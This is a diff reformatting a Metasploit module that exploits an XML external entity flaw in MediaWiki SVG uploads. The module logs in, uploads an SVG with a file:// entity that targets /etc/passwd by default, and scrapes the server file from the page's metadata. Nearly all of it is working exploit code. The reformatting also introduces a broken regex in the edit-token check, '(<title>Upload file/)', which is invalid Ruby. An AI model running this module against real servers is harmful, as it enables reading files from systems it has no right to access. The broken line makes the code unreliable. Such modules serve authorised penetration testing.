@@ -10,8 +10,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'MediaWiki SVG XML Entity Expansion Remote File Access',
-      'Description'  =>  %q{
+      'Name' => 'MediaWiki SVG XML Entity Expansion Remote File Access',
+      'Description' => %q{
           This module attempts to read a remote file from the server using a vulnerability
         in the way MediaWiki handles SVG files. The vulnerability occurs while trying to
         expand external entities with the SYSTEM identifier. In order to work MediaWiki must
@@ -23,45 +23,44 @@ class MetasploitModule < Msf::Auxiliary
         $wgFileExtensions[] must include 'svg', $wgSVGConverter must be set to something
         other than 'false'.
       },
-      'References'   =>
-        [
+      'References' => [
           [ 'OSVDB', '92490' ],
           [ 'URL', 'https://phabricator.wikimedia.org/T48859' ],
           [ 'URL', 'https://web.archive.org/web/20130421060020/http://www.gossamer-threads.com/lists/wiki/mediawiki-announce/350229']
         ],
-      'Author'       =>
-        [
+      'Author' => [
           'Daniel Franke',      # Vulnerability discovery and PoC
           'juan vazquez',       # Metasploit module
           'Christian Mehlmauer' # Metasploit module
         ],
-      'License'      => MSF_LICENSE
+      'License' => MSF_LICENSE
     )
 
     register_options(
-    [
-      Opt::RPORT(80),
-      OptString.new('TARGETURI', [true, 'Path to MediaWiki', '/mediawiki']),
-      OptString.new('RFILE', [true, 'Remote File', '/etc/passwd']),
-      OptString.new('USERNAME', [ false,  "The user to authenticate as"]),
-      OptString.new('PASSWORD', [ false,  "The password to authenticate with" ])
-    ])
+      [
+        Opt::RPORT(80),
+        OptString.new('TARGETURI', [true, 'Path to MediaWiki', '/mediawiki']),
+        OptString.new('RFILE', [true, 'Remote File', '/etc/passwd']),
+        OptString.new('USERNAME', [ false, 'The user to authenticate as']),
+        OptString.new('PASSWORD', [ false, 'The password to authenticate with' ])
+      ]
+)
 
     register_autofilter_ports([ 80 ])
   end
 
   def get_first_session
     res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "index.php"),
-      'method'   => 'GET',
+      'uri' => normalize_uri(target_uri.to_s, 'index.php'),
+      'method' => 'GET',
       'vars_get' => {
-        "title"    => "Special:UserLogin",
-        "returnto" => "Main+Page"
+        'title' => 'Special:UserLogin',
+        'returnto' => 'Main+Page'
       }
     })
 
     if res && res.code == 200 && res.get_cookies =~ /([^\s]*session)=([a-z0-9]+)/
-      return $1,$2
+      return ::Regexp.last_match(1), ::Regexp.last_match(2)
     else
       return nil
     end
@@ -69,34 +68,33 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_login_token
     res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "index.php"),
-      'method'   => 'GET',
+      'uri' => normalize_uri(target_uri.to_s, 'index.php'),
+      'method' => 'GET',
       'vars_get' => {
-        "title"    => "Special:UserLogin",
-        "returnto" => "Main+Page"
+        'title' => 'Special:UserLogin',
+        'returnto' => 'Main+Page'
       },
       'cookie' => session_cookie
     })
 
-    if res and res.code == 200 and res.body =~ /name="wpLoginToken" value="([a-f0-9]*)"/
-      return $1
+    if res && (res.code == 200) && res.body =~(/name="wpLoginToken" value="([a-f0-9]*)"/)
+      return ::Regexp.last_match(1)
     else
       return nil
     end
-
   end
 
   def parse_auth_cookie(cookies)
-    cookies.split(";").each do |part|
+    cookies.split(';').each do |part|
       case part
-        when /([^\s]*UserID)=(.*)/
-          @wiki_user_id_name = $1
-          @wiki_user_id = $2
-        when /([^\s]*UserName)=(.*)/
-          @wiki_user_name_name = $1
-          @wiki_user_name = $2
-        when /session=(.*)/
-          @wiki_session = $1
+      when /([^\s]*UserID)=(.*)/
+          @wiki_user_id_name = ::Regexp.last_match(1)
+          @wiki_user_id = ::Regexp.last_match(2)
+      when /([^\s]*UserName)=(.*)/
+          @wiki_user_name_name = ::Regexp.last_match(1)
+          @wiki_user_name = ::Regexp.last_match(2)
+      when /session=(.*)/
+          @wiki_session = ::Regexp.last_match(1)
         else
           next
       end
@@ -104,7 +102,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def session_cookie
-    if @user and @password
+    if @user && @password
       return "#{@wiki_session_name}=#{@wiki_session}; #{@wiki_user_id_name}=#{@wiki_user_id}; #{@wiki_user_name_name}=#{@wiki_user_name}"
     else
       return "#{@wiki_session_name}=#{@wiki_session}"
@@ -113,24 +111,24 @@ class MetasploitModule < Msf::Auxiliary
 
   def authenticate
     res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "index.php"),
-      'method'   => 'POST',
+      'uri' => normalize_uri(target_uri.to_s, 'index.php'),
+      'method' => 'POST',
       'vars_get' => {
-        "title"  => "Special:UserLogin",
-        "action" => "submitlogin",
-        "type"   => "login"
+        'title' => 'Special:UserLogin',
+        'action' => 'submitlogin',
+        'type' => 'login'
       },
       'vars_post' => {
-        "wpName"         => datastore['USERNAME'],
-        "wpPassword"     => datastore['PASSWORD'],
-        "wpLoginAttempt" => "Log+in",
-        "wpLoginToken"   => @login_token,
-        "returnto"       => "Main+Page"
+        'wpName' => datastore['USERNAME'],
+        'wpPassword' => datastore['PASSWORD'],
+        'wpLoginAttempt' => 'Log+in',
+        'wpLoginToken' => @login_token,
+        'returnto' => 'Main+Page'
       },
       'cookie' => session_cookie
     })
 
-    if res and res.code == 302 and res.get_cookies.include?('UserID=')
+    if res && (res.code == 302) && res.get_cookies.include?('UserID=')
       parse_auth_cookie(res.get_cookies)
       return true
     else
@@ -140,58 +138,57 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_edit_token
     res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "index.php", "Special:Upload"),
-      'method'   => 'GET',
+      'uri' => normalize_uri(target_uri.to_s, 'index.php', 'Special:Upload'),
+      'method' => 'GET',
       'cookie' => session_cookie
     })
 
-    if res and res.code == 200 and res.body =~/<title>Upload file/ and res.body =~ /<input id="wpEditToken" type="hidden" value="([0-9a-f]*)\+\\" name="wpEditToken" \/>/
-      return $1
+    if res && (res.code == 200) && res.body =~ (<title>Upload file/) && res.body =~(%r{<input id="wpEditToken" type="hidden" value="([0-9a-f]*)\+\\" name="wpEditToken" />})
+      return ::Regexp.last_match(1)
     else
       return nil
     end
-
   end
 
   def upload_file
     entity = Rex::Text.rand_text_alpha_lower(3)
     @file_name = Rex::Text.rand_text_alpha_lower(4)
-    svg_file = %Q|
+    svg_file = %|
     <!DOCTYPE svg [<!ENTITY #{entity} SYSTEM "file://#{datastore['RFILE']}">]>
     <svg xmlns="http://www.w3.org/2000/svg" version="1.1">
       <desc>&#{entity};</desc>
       <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)" />
     </svg>
     |
-    svg_file.gsub!(/\t\t/, "")
+    svg_file.gsub!(/\t\t/, '')
 
     post_data = Rex::MIME::Message.new
-    post_data.add_part(svg_file, "image/svg+xml", nil, "form-data; name=\"wpUploadFile\"; filename=\"#{@file_name}.svg\"")
-    post_data.add_part("#{@file_name.capitalize}.svg", nil, nil, "form-data; name=\"wpDestFile\"")
-    post_data.add_part("", nil, nil, "form-data; name=\"wpUploadDescription\"")
-    post_data.add_part("", nil, nil, "form-data; name=\"wpLicense\"")
-    post_data.add_part("#{@edit_token}+\\", nil, nil, "form-data; name=\"wpEditToken\"")
-    post_data.add_part("Special:Upload", nil, nil, "form-data; name=\"title\"")
-    post_data.add_part("1", nil, nil, "form-data; name=\"wpDestFileWarningAck\"")
-    post_data.add_part("Upload file", nil, nil, "form-data; name=\"wpUpload\"")
+    post_data.add_part(svg_file, 'image/svg+xml', nil, "form-data; name=\"wpUploadFile\"; filename=\"#{@file_name}.svg\"")
+    post_data.add_part("#{@file_name.capitalize}.svg", nil, nil, 'form-data; name="wpDestFile"')
+    post_data.add_part('', nil, nil, 'form-data; name="wpUploadDescription"')
+    post_data.add_part('', nil, nil, 'form-data; name="wpLicense"')
+    post_data.add_part("#{@edit_token}+\\", nil, nil, 'form-data; name="wpEditToken"')
+    post_data.add_part('Special:Upload', nil, nil, 'form-data; name="title"')
+    post_data.add_part('1', nil, nil, 'form-data; name="wpDestFileWarningAck"')
+    post_data.add_part('Upload file', nil, nil, 'form-data; name="wpUpload"')
 
     data = post_data.to_s
 
     res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "index.php", "Special:Upload"),
-      'method'   => 'POST',
-      'data'     => data,
-      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
+      'uri' => normalize_uri(target_uri.to_s, 'index.php', 'Special:Upload'),
+      'method' => 'POST',
+      'data' => data,
+      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
       'cookie' => session_cookie
     })
 
-    if res and res.code == 302 and res.headers['Location']
+    if res && (res.code == 302) && res.headers['Location']
       return res.headers['Location']
     else
       # try to output the errormessage
-      if res and res.body
-        error = res.body.scan(/<div class="error">(.*?)<\/div>/m)[0]
-        if error and error.size == 1
+      if res && res.body
+        error = res.body.scan(%r{<div class="error">(.*?)</div>}m)[0]
+        if error && (error.size == 1)
           vprint_error(error[0])
         end
       end
@@ -201,13 +198,13 @@ class MetasploitModule < Msf::Auxiliary
 
   def read_data
     res = send_request_cgi({
-      'uri'      => @svg_uri,
-      'method'   => 'GET',
+      'uri' => @svg_uri,
+      'method' => 'GET',
       'cookie' => session_cookie
     })
 
-    if res and res.code == 200 and res.body =~ /File:#{@file_name.capitalize}.svg/ and res.body =~ /Metadata/ and res.body =~ /<th>Image title<\/th>\n<td>(.*)<\/td>\n<\/tr><\/table>/m
-      return $1
+    if res && (res.code == 200) && res.body =~(/File:#{@file_name.capitalize}.svg/) && res.body =~(/Metadata/) && res.body =~(%r{<th>Image title</th>\n<td>(.*)</td>\n</tr></table>}m)
+      return ::Regexp.last_match(1)
     else
       return nil
     end
@@ -222,7 +219,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     vprint_status("#{peer} Sessioncookie: #{@wiki_session_name}=#{@wiki_session}")
 
-    if @user and not @user.empty? and @password and not @password.empty?
+    if @user && (!@user.empty?) && @password && (!@password.empty?)
       vprint_status("#{peer} MediaWiki - Getting login token...")
       @login_token = get_login_token
       if @login_token.nil?
@@ -231,7 +228,7 @@ class MetasploitModule < Msf::Auxiliary
       end
       vprint_status("#{peer} Logintoken: #{@login_token}")
 
-      if not authenticate
+      if !authenticate
         print_error("#{peer} MediaWiki - Failed to authenticate")
         return
       end
@@ -258,7 +255,7 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_status("#{peer} MediaWiki - Retrieving remote file...")
     loot = read_data
-    if loot.nil? or loot.empty?
+    if loot.nil? || loot.empty?
       print_error("#{peer} MediaWiki - Failed to retrieve remote file")
       return
     end
